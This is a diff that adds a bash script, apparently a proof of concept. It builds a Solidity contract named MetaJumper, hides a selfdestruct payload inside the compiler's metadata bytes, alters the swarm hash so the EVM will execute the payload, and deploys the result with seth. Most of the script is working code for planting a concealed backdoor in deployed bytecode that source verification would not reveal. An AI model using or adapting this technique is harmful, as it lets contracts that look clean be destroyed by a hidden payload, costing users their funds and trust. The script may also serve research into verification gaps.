@@ -1,0 +1,83 @@
+#!/usr/bin/env bash
+
+default_json_path="out/dapp.sol.json"
+default_contract_path="src/MetaJumper.sol:MetaJumper"
+malicious_code="5b6000ff" # jumpdest, push 0x0, selfdestruct
+
+[[ $JUMPER_JSON_PATH ]] || \
+    echo "warning: JUMPER_JSON_PATH not set, using ${default_json_path}"
+[[ $JUMPER_CONTRACT_PATH ]] || \
+    echo "warning: JUMPER_CONTRACT_PATH not set, using ${default_contract_path}"
+
+function metafy_bytecode() {
+    # metadata from solc 0.4 output:
+    # 0xa1 0x65 'b' 'z' 'z' 'r' '0' 0x58 0x20 <32 bytes swarm hash> 0x00 0x29
+    # 0xa1 65 62 7a 7a 72 30 58 20 <swarm hash> 0x00 29     -- hex
+    # 0xa1 05 02 7a 7a 72 30 58 20 <swarm hash> 0x00 29     -- 6s removed
+    local bytecode=$1
+
+    # metadata is last 43 bytes
+    local pre_metadata=${bytecode:0:-86}
+
+    # trim the last 2 bytes of metadata + the length of our malicious code
+    local metadata=${bytecode: -86:-(${#malicious_code}+4)}
+
+    # sanity check. metadata should start as above
+    if [ ${metadata:0:18} != "a165627a7a72305820" ]; then
+        >&2 echo "ERROR: could not identify metadata.";
+        exit 1
+    fi
+
+    # replace all 6s in the swarm hash with 0. Hack to prevent evm
+    # interpreting malicious code as push data
+    local metadata_tail=${metadata:18}
+    local metadata_subsix="${metadata:0:18}${metadata_tail//6/0}"
+
+    # append our malicious code and the standard 0x0029
+    local malicious_metadata="${metadata_subsix}${malicious_code}0029"
+    local malicious_bytecode="${pre_metadata}${malicious_metadata}"
+    if [ ${#malicious_bytecode} != ${#bytecode} ]; then
+        # whoops
+        >&2 echo "ERROR: resulting bytecode malformed.";
+        exit 1
+    fi
+    echo ${malicious_bytecode}
+}
+
+function build_contracts() {
+    export DAPP_SOLC_VERSION=0.4.24
+    dapp build
+}
+
+function get_bytecode() {
+    echo $(cat "${JUMPER_JSON_PATH:-$default_json_path}" \
+        | jq -r '.contracts."'${JUMPER_CONTRACT_PATH:-$default_contract_path}'".bin')
+}
+
+function confirm_deployment() {
+    echo "bytecode to deploy: $1"
+    echo "ETH_RPC_URL: ${ETH_RPC_URL}"
+    echo "ETH_FROM: ${ETH_FROM}"
+    read -r -p "${2:-Continue? [y/N]} " response
+    response=${response,,}    # tolower
+    if [[ "$response" =~ ^(yes|y)$ ]]
+    then
+        true
+    else
+        false
+    fi
+}
+
+function deploy() {
+    echo "deploying..."
+    echo "---------------------"
+    seth send --create $1
+}
+
+set -e
+build_contracts
+og_bytecode=$(get_bytecode)
+echo -e "\nOriginal bytecode: ${og_bytecode}\n"
+new_bytecode=$(metafy_bytecode ${og_bytecode})
+
+confirm_deployment $new_bytecode && deploy $new_bytecode
